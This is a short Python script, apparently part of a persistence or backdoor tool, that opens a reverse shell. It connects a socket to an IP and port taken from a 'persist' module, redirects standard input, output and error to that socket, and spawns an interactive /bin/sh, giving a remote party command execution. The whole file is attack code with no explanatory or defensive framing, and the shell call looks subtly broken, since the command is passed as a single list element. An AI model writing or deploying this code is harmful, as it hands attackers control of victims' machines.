import socket
import subprocess
import os
from persist import pingClient as pc

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((pc.ip, pc.port))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh -i"])